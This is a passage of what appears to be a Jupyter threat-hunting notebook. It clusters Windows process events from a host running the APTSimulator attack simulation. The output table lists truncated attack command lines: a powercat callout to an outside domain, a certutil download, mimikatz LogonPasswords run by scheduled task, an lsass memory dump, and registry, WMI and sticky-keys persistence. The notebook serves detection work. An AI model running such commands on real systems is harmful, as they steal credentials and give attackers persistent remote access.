    "import seaborn as sns\n",
    "sns.set(style=\"darkgrid\")\n",
    "\n",
    "if processes_on_host is not None and not processes_on_host.empty:\n",
    "    proc_plot = sns.catplot(y=\"processName\", x=\"commandlineTokensFull\", \n",
    "                            data=feature_procs.sort_values('processName'),\n",
    "                            kind='box', height=10)\n",
    "    proc_plot.fig.suptitle('Variability of Commandline Tokens', x=1, y=1)\n",
    "\n",
    "    proc_plot = sns.catplot(y=\"processName\", x=\"pathLogScore\", \n",
    "                            data=feature_procs.sort_values('processName'),\n",
    "                            kind='box', height=10, hue='isSystemSession')\n",
    "    proc_plot.fig.suptitle('Variability of Path', x=1, y=1);"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 115,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:35:20.497871Z",
     "start_time": "2019-10-31T22:35:16.291785Z"
    },
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "View the clustered data? y/ny\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>LastEventTime</th>\n",
       "      <th>NewProcessName</th>\n",
       "      <th>CommandLine</th>\n",
       "      <th>ClusterSize</th>\n",
       "      <th>commandlineTokensFull</th>\n",
       "      <th>pathScore</th>\n",
       "      <th>isSystemSession</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>2019-09-12 20:08:31.320</td>\n",
       "      <td>2019-09-12 21:59:00.803</td>\n",
       "      <td>C:\\Windows\\System32\\conhost.exe</td>\n",
       "      <td>\\??\\C:\\windows\\system32\\conhost.exe 0xffffffff -ForceV1</td>\n",
       "      <td>62</td>\n",
       "      <td>10</td>\n",
       "      <td>3028</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>2019-09-12 21:36:15.273</td>\n",
       "      <td>2019-09-12 21:54:20.937</td>\n",
       "      <td>C:\\Windows\\System32\\PING.EXE</td>\n",
       "      <td>ping  -n 5 127.0.0.1</td>\n",
       "      <td>35</td>\n",
       "      <td>9</td>\n",
       "      <td>2468</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>32</th>\n",
       "      <td>2019-09-12 21:36:22.940</td>\n",
       "      <td>2019-09-12 21:38:54.940</td>\n",
       "      <td>C:\\Windows\\System32\\cmd.exe</td>\n",
       "      <td>C:\\windows\\system32\\cmd.exe /c dir /b /a-d .\\test-sets\\\"collection\"\\*.bat</td>\n",
       "      <td>6</td>\n",
       "      <td>22</td>\n",
       "      <td>2570</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>2019-09-12 21:36:31.043</td>\n",
       "      <td>2019-09-12 21:39:07.257</td>\n",
       "      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</td>\n",
       "      <td>powershell.exe  -Exec ByPasS \". C:\\TMP\\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -i...</td>\n",
       "      <td>5</td>\n",
       "      <td>32</td>\n",
       "      <td>5576</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>2019-09-12 21:36:31.160</td>\n",
       "      <td>2019-09-12 21:39:20.863</td>\n",
       "      <td>C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\7z.exe</td>\n",
       "      <td>\"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\7z.exe\"  e -paptsimulato...</td>\n",
       "      <td>4</td>\n",
       "      <td>46</td>\n",
       "      <td>7542</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>159</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</td>\n",
       "      <td>powershell.exe  -Exec ByPasS \". C:\\TMP\\WMIBackdoor.ps1;$Trigger1=New-WMIBackdoorTrigger -Process...</td>\n",
       "      <td>1</td>\n",
       "      <td>40</td>\n",
       "      <td>5576</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>109</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Windows\\regedit.exe</td>\n",
       "      <td>regedit.exe  /s \"C:\\Users\\AttackAdmin\\AppData\\Local\\Temp\\2\\jsfix.reg\"</td>\n",
       "      <td>1</td>\n",
       "      <td>16</td>\n",
       "      <td>2164</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>103</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Windows\\System32\\eventcreate.exe</td>\n",
       "      <td>eventcreate  /L System /T Success /ID 100 /D \"A service was installed in the system. Service Nam...</td>\n",
       "      <td>1</td>\n",
       "      <td>66</td>\n",
       "      <td>3436</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>86</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</td>\n",
       "      <td>powershell  -Exec Bypass \". C:\\TMP\\nc.ps1;powercat -c www.googleaccountsservices.com -p 80 -t 2 ...</td>\n",
       "      <td>1</td>\n",
       "      <td>28</td>\n",
       "      <td>5576</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Windows\\System32\\cmd.exe</td>\n",
       "      <td>\"C:\\windows\\system32\\cmd.exe\" /C \"schtasks /create /xml C:\\\\Users\\\\AttackAdmin\\\\AppData\\\\Local\\\\...</td>\n",
       "      <td>1</td>\n",
       "      <td>36</td>\n",
       "      <td>2570</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>75</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Users\\Public\\svchost.exe</td>\n",
       "      <td>\"C:\\Users\\Public\\svchost.exe\"</td>\n",
       "      <td>1</td>\n",
       "      <td>7</td>\n",
       "      <td>2684</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>41</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\curl.exe</td>\n",
       "      <td>\"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\curl.exe\"  -s -o /dev/nu...</td>\n",
       "      <td>1</td>\n",
       "      <td>36</td>\n",
       "      <td>7803</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>37</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Windows\\System32\\cmd.exe</td>\n",
       "      <td>C:\\windows\\system32\\cmd.exe /c dir /b /a-d .\\test-sets\\\"command-and-control\"\\*.bat</td>\n",
       "      <td>1</td>\n",
       "      <td>24</td>\n",
       "      <td>2570</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Windows\\System32\\reg.exe</td>\n",
       "      <td>REG  ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d \"C:\\TMP\\mim.exe sekurlsa:...</td>\n",
       "      <td>1</td>\n",
       "      <td>28</td>\n",
       "      <td>2580</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>85</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\7z.exe</td>\n",
       "      <td>\"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\7z.exe\"  e -paptsimulato...</td>\n",
       "      <td>1</td>\n",
       "      <td>37</td>\n",
       "      <td>7542</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Windows\\System32\\reg.exe</td>\n",
       "      <td>reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.e...</td>\n",
       "      <td>1</td>\n",
       "      <td>34</td>\n",
       "      <td>2580</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Windows\\System32\\schtasks.exe</td>\n",
       "      <td>schtasks  /create /f /sc minute /mo 5 /tn GameOver /tr \"C:\\TMP\\mim.exe sekurlsa::LogonPasswords ...</td>\n",
       "      <td>1</td>\n",
       "      <td>32</td>\n",
       "      <td>3130</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>2019-09-12 21:36:31.273</td>\n",
       "      <td>2019-09-12 21:54:25.070</td>\n",
       "      <td>C:\\Windows\\System32\\schtasks.exe</td>\n",
       "      <td>schtasks  /create /xml C:\\\\Users\\\\AttackAdmin\\\\AppData\\\\Local\\\\Temp\\\\2\\\\wscript2.xml /tn falshup...</td>\n",
       "      <td>1</td>\n",
       "      <td>25</td>\n",
       "      <td>3130</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>38</th>\n",
       "      <td>2019-09-12 21:36:31.297</td>\n",
       "      <td>2019-09-12 21:36:31.657</td>\n",
       "      <td>C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\curl.exe</td>\n",
       "      <td>\"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\curl.exe\"  -s -o /dev/nu...</td>\n",
       "      <td>2</td>\n",
       "      <td>35</td>\n",
       "      <td>7803</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>43</th>\n",
       "      <td>2019-09-12 21:36:37.037</td>\n",
       "      <td>2019-09-12 21:38:36.033</td>\n",
       "      <td>C:\\Windows\\System32\\nslookup.exe</td>\n",
       "      <td>nslookup  msupdater.com</td>\n",
       "      <td>3</td>\n",
       "      <td>4</td>\n",
       "      <td>3153</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>45</th>\n",
       "      <td>2019-09-12 21:36:37.487</td>\n",
       "      <td>2019-09-12 21:38:35.280</td>\n",
       "      <td>C:\\Windows\\System32\\nslookup.exe</td>\n",
       "      <td>nslookup  freenow.chickenkiller.com</td>\n",
       "      <td>4</td>\n",
       "      <td>5</td>\n",
       "      <td>3153</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>49</th>\n",
       "      <td>2019-09-12 21:36:42.073</td>\n",
       "      <td>2019-09-12 21:37:34.987</td>\n",
       "      <td>C:\\Windows\\regedit.exe</td>\n",
       "      <td>regedit.exe  /s C:\\Users\\AttackAdmin\\AppData\\Local\\Temp\\2\\jsfix.reg</td>\n",
       "      <td>3</td>\n",
       "      <td>14</td>\n",
       "      <td>2164</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>50</th>\n",
       "      <td>2019-09-12 21:36:42.100</td>\n",
       "      <td>2019-09-12 21:38:01.890</td>\n",
       "      <td>C:\\Windows\\System32\\cmd.exe</td>\n",
       "      <td>cmd.exe  /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/NextronSystems/AP...</td>\n",
       "      <td>2</td>\n",
       "      <td>31</td>\n",
       "      <td>2570</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>52</th>\n",
       "      <td>2019-09-12 21:36:42.330</td>\n",
       "      <td>2019-09-12 21:38:35.260</td>\n",
       "      <td>C:\\Windows\\System32\\wscript.exe</td>\n",
       "      <td>wscript.exe  C:\\Users\\Public\\en-US.js</td>\n",
       "      <td>3</td>\n",
       "      <td>9</td>\n",
       "      <td>3042</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>53</th>\n",
       "      <td>2019-09-12 21:36:42.420</td>\n",
       "      <td>2019-09-12 21:38:02.240</td>\n",
       "      <td>C:\\Windows\\SysWOW64\\rundll32.exe</td>\n",
       "      <td>\"C:\\windows\\SysWOW64\\rundll32.exe\"</td>\n",
       "      <td>6</td>\n",
       "      <td>7</td>\n",
       "      <td>2952</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>54</th>\n",
       "      <td>2019-09-12 21:36:42.457</td>\n",
       "      <td>2019-09-12 21:38:02.273</td>\n",
       "      <td>C:\\Windows\\SysWOW64\\cmd.exe</td>\n",
       "      <td>cmd</td>\n",
       "      <td>2</td>\n",
       "      <td>0</td>\n",
       "      <td>2502</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>2019-09-12 21:36:42.517</td>\n",
       "      <td>2019-09-12 21:54:24.967</td>\n",
       "      <td>C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\7z.exe</td>\n",
       "      <td>\"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\7z.exe\"  e -paptsimulato...</td>\n",
       "      <td>18</td>\n",
       "      <td>42</td>\n",
       "      <td>7542</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>57</th>\n",
       "      <td>2019-09-12 21:36:42.627</td>\n",
       "      <td>2019-09-12 21:38:29.010</td>\n",
       "      <td>C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\curl.exe</td>\n",
       "      <td>\"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\curl.exe\"  -s -o /dev/nu...</td>\n",
       "      <td>3</td>\n",
       "      <td>49</td>\n",
       "      <td>7803</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>58</th>\n",
       "      <td>2019-09-12 21:36:42.753</td>\n",
       "      <td>2019-09-12 21:36:43.477</td>\n",
       "      <td>C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\curl.exe</td>\n",
       "      <td>\"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\curl.exe\"  -s -o /dev/nu...</td>\n",
       "      <td>2</td>\n",
       "      <td>53</td>\n",
       "      <td>7803</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>89</th>\n",
       "      <td>2019-09-12 21:37:00.913</td>\n",
       "      <td>2019-09-12 21:54:25.490</td>\n",
       "      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</td>\n",
       "      <td>powershell.exe  -Exec ByPasS \". \\\"C:\\TMP\\WMIBackdoor.ps1\\\";$Trigger2=New-WMIBackdoorTrigger -Tim...</td>\n",
       "      <td>5</td>\n",
       "      <td>50</td>\n",
       "      <td>5576</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>94</th>\n",
       "      <td>2019-09-12 21:37:05.683</td>\n",
       "      <td>2019-09-12 21:38:59.007</td>\n",
       "      <td>C:\\Users\\Public\\procdump64.exe</td>\n",
       "      <td>\"C:\\Users\\Public\\procdump64.exe\"  -accepteula -ma lsass.exe \"C:\\TMP\\somethingwindows.dmp\"</td>\n",
       "      <td>2</td>\n",
       "      <td>22</td>\n",
       "      <td>2886</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>62</th>\n",
       "      <td>2019-09-12 21:37:39.103</td>\n",
       "      <td>2019-09-12 21:37:47.370</td>\n",
       "      <td>C:\\Windows\\System32\\net1.exe</td>\n",
       "      <td>C:\\windows\\system32\\net1  user guest /active:yes</td>\n",
       "      <td>4</td>\n",
       "      <td>10</td>\n",
       "      <td>2638</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>121</th>\n",
       "      <td>2019-09-12 21:38:10.897</td>\n",
       "      <td>2019-09-12 21:38:22.993</td>\n",
       "      <td>C:\\TMP\\nbtscan.exe</td>\n",
       "      <td>\"C:\\TMP\\nbtscan.exe\"  192.168.1.0/24</td>\n",
       "      <td>3</td>\n",
       "      <td>13</td>\n",
       "      <td>1663</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>127</th>\n",
       "      <td>2019-09-12 21:38:33.173</td>\n",
       "      <td>2019-09-12 21:38:33.193</td>\n",
       "      <td>C:\\Windows\\System32\\whoami.exe</td>\n",
       "      <td>whoami</td>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "      <td>2907</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2019-09-12 21:38:44.390</td>\n",
       "      <td>2019-09-12 21:39:03.087</td>\n",
       "      <td>C:\\Windows\\System32\\reg.exe</td>\n",
       "      <td>reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v UpdateSvc /t REG_SZ /d \"C:\\TMP\\...</td>\n",
       "      <td>2</td>\n",
       "      <td>45</td>\n",
       "      <td>2580</td>\n",
       "      <td>False</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "              TimeGenerated           LastEventTime  \\\n",
       "0   2019-09-12 20:08:31.320 2019-09-12 21:59:00.803   \n",
       "3   2019-09-12 21:36:15.273 2019-09-12 21:54:20.937   \n",
       "32  2019-09-12 21:36:22.940 2019-09-12 21:38:54.940   \n",
       "5   2019-09-12 21:36:31.043 2019-09-12 21:39:07.257   \n",
       "12  2019-09-12 21:36:31.160 2019-09-12 21:39:20.863   \n",
       "159 2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "109 2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "103 2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "86  2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "6   2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "75  2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "41  2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "37  2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "14  2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "85  2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "11  2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "9   2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "7   2019-09-12 21:36:31.273 2019-09-12 21:54:25.070   \n",
       "38  2019-09-12 21:36:31.297 2019-09-12 21:36:31.657   \n",
       "43  2019-09-12 21:36:37.037 2019-09-12 21:38:36.033   \n",
       "45  2019-09-12 21:36:37.487 2019-09-12 21:38:35.280   \n",
       "49  2019-09-12 21:36:42.073 2019-09-12 21:37:34.987   \n",
       "50  2019-09-12 21:36:42.100 2019-09-12 21:38:01.890   \n",
       "52  2019-09-12 21:36:42.330 2019-09-12 21:38:35.260   \n",
       "53  2019-09-12 21:36:42.420 2019-09-12 21:38:02.240   \n",
       "54  2019-09-12 21:36:42.457 2019-09-12 21:38:02.273   \n",
       "4   2019-09-12 21:36:42.517 2019-09-12 21:54:24.967   \n",
       "57  2019-09-12 21:36:42.627 2019-09-12 21:38:29.010   \n",
       "58  2019-09-12 21:36:42.753 2019-09-12 21:36:43.477   \n",
       "89  2019-09-12 21:37:00.913 2019-09-12 21:54:25.490   \n",
       "94  2019-09-12 21:37:05.683 2019-09-12 21:38:59.007   \n",
       "62  2019-09-12 21:37:39.103 2019-09-12 21:37:47.370   \n",
       "121 2019-09-12 21:38:10.897 2019-09-12 21:38:22.993   \n",
       "127 2019-09-12 21:38:33.173 2019-09-12 21:38:33.193   \n",
       "2   2019-09-12 21:38:44.390 2019-09-12 21:39:03.087   \n",
       "\n",
       "                                                                     NewProcessName  \\\n",
       "0                                                   C:\\Windows\\System32\\conhost.exe   \n",
       "3                                                      C:\\Windows\\System32\\PING.EXE   \n",
       "32                                                      C:\\Windows\\System32\\cmd.exe   \n",
       "5                         C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe   \n",
       "12     C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\7z.exe   \n",
       "159                       C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe   \n",
       "109                                                          C:\\Windows\\regedit.exe   \n",
       "103                                             C:\\Windows\\System32\\eventcreate.exe   \n",
       "86                        C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe   \n",
       "6                                                       C:\\Windows\\System32\\cmd.exe   \n",
       "75                                                      C:\\Users\\Public\\svchost.exe   \n",
       "41   C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\curl.exe   \n",
       "37                                                      C:\\Windows\\System32\\cmd.exe   \n",
       "14                                                      C:\\Windows\\System32\\reg.exe   \n",
       "85     C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\7z.exe   \n",
       "11                                                      C:\\Windows\\System32\\reg.exe   \n",
       "9                                                  C:\\Windows\\System32\\schtasks.exe   \n",
       "7                                                  C:\\Windows\\System32\\schtasks.exe   \n",
       "38   C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\curl.exe   \n",
       "43                                                 C:\\Windows\\System32\\nslookup.exe   \n",
       "45                                                 C:\\Windows\\System32\\nslookup.exe   \n",
       "49                                                           C:\\Windows\\regedit.exe   \n",
       "50                                                      C:\\Windows\\System32\\cmd.exe   \n",
       "52                                                  C:\\Windows\\System32\\wscript.exe   \n",
       "53                                                 C:\\Windows\\SysWOW64\\rundll32.exe   \n",
       "54                                                      C:\\Windows\\SysWOW64\\cmd.exe   \n",
       "4      C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\7z.exe   \n",
       "57   C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\curl.exe   \n",
       "58   C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\helpers\\curl.exe   \n",
       "89                        C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe   \n",
       "94                                                   C:\\Users\\Public\\procdump64.exe   \n",
       "62                                                     C:\\Windows\\System32\\net1.exe   \n",
       "121                                                              C:\\TMP\\nbtscan.exe   \n",
       "127                                                  C:\\Windows\\System32\\whoami.exe   \n",
       "2                                                       C:\\Windows\\System32\\reg.exe   \n",
       "\n",
       "                                                                                             CommandLine  \\\n",
       "0                                                \\??\\C:\\windows\\system32\\conhost.exe 0xffffffff -ForceV1   \n",
       "3                                                                                  ping  -n 5 127.0.0.1    \n",
       "32                             C:\\windows\\system32\\cmd.exe /c dir /b /a-d .\\test-sets\\\"collection\"\\*.bat   \n",
       "5    powershell.exe  -Exec ByPasS \". C:\\TMP\\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -i...   \n",
       "12   \"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\7z.exe\"  e -paptsimulato...   \n",
       "159  powershell.exe  -Exec ByPasS \". C:\\TMP\\WMIBackdoor.ps1;$Trigger1=New-WMIBackdoorTrigger -Process...   \n",
       "109                                regedit.exe  /s \"C:\\Users\\AttackAdmin\\AppData\\Local\\Temp\\2\\jsfix.reg\"   \n",
       "103  eventcreate  /L System /T Success /ID 100 /D \"A service was installed in the system. Service Nam...   \n",
       "86   powershell  -Exec Bypass \". C:\\TMP\\nc.ps1;powercat -c www.googleaccountsservices.com -p 80 -t 2 ...   \n",
       "6    \"C:\\windows\\system32\\cmd.exe\" /C \"schtasks /create /xml C:\\\\Users\\\\AttackAdmin\\\\AppData\\\\Local\\\\...   \n",
       "75                                                                         \"C:\\Users\\Public\\svchost.exe\"   \n",
       "41   \"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\curl.exe\"  -s -o /dev/nu...   \n",
       "37                    C:\\windows\\system32\\cmd.exe /c dir /b /a-d .\\test-sets\\\"command-and-control\"\\*.bat   \n",
       "14   REG  ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d \"C:\\TMP\\mim.exe sekurlsa:...   \n",
       "85   \"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\7z.exe\"  e -paptsimulato...   \n",
       "11   reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.e...   \n",
       "9    schtasks  /create /f /sc minute /mo 5 /tn GameOver /tr \"C:\\TMP\\mim.exe sekurlsa::LogonPasswords ...   \n",
       "7    schtasks  /create /xml C:\\\\Users\\\\AttackAdmin\\\\AppData\\\\Local\\\\Temp\\\\2\\\\wscript2.xml /tn falshup...   \n",
       "38   \"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\curl.exe\"  -s -o /dev/nu...   \n",
       "43                                                                              nslookup  msupdater.com    \n",
       "45                                                                  nslookup  freenow.chickenkiller.com    \n",
       "49                                   regedit.exe  /s C:\\Users\\AttackAdmin\\AppData\\Local\\Temp\\2\\jsfix.reg   \n",
       "50   cmd.exe  /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/NextronSystems/AP...   \n",
       "52                                                                 wscript.exe  C:\\Users\\Public\\en-US.js   \n",
       "53                                                                    \"C:\\windows\\SysWOW64\\rundll32.exe\"   \n",
       "54                                                                                                   cmd   \n",
       "4    \"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\7z.exe\"  e -paptsimulato...   \n",
       "57   \"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\curl.exe\"  -s -o /dev/nu...   \n",
       "58   \"C:\\Users\\AttackAdmin\\Desktop\\APTSimulator_pw_apt\\APTSimulator\\\\helpers\\curl.exe\"  -s -o /dev/nu...   \n",
       "89   powershell.exe  -Exec ByPasS \". \\\"C:\\TMP\\WMIBackdoor.ps1\\\";$Trigger2=New-WMIBackdoorTrigger -Tim...   \n",
       "94            \"C:\\Users\\Public\\procdump64.exe\"  -accepteula -ma lsass.exe \"C:\\TMP\\somethingwindows.dmp\"    \n",
       "62                                                      C:\\windows\\system32\\net1  user guest /active:yes   \n",
       "121                                                                \"C:\\TMP\\nbtscan.exe\"  192.168.1.0/24    \n",
       "127                                                                                             whoami     \n",
       "2    reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v UpdateSvc /t REG_SZ /d \"C:\\TMP\\...   \n",
       "\n",
       "     ClusterSize  commandlineTokensFull  pathScore  isSystemSession  \n",
       "0             62                     10       3028            False  \n",
       "3             35                      9       2468            False  \n",
       "32             6                     22       2570            False  \n",
       "5              5                     32       5576            False  \n",
       "12             4                     46       7542            False  \n",
       "159            1                     40       5576            False  \n",
       "109            1                     16       2164            False  \n",
       "103            1                     66       3436            False  \n",
       "86             1                     28       5576            False  \n",
       "6              1                     36       2570            False  \n",
       "75             1                      7       2684            False  \n",
       "41             1                     36       7803            False  \n",
       "37             1                     24       2570            False  \n",
       "14             1                     28       2580            False  \n",
       "85             1                     37       7542            False  \n",
       "11             1                     34       2580            False  \n",
       "9              1                     32       3130            False  \n",
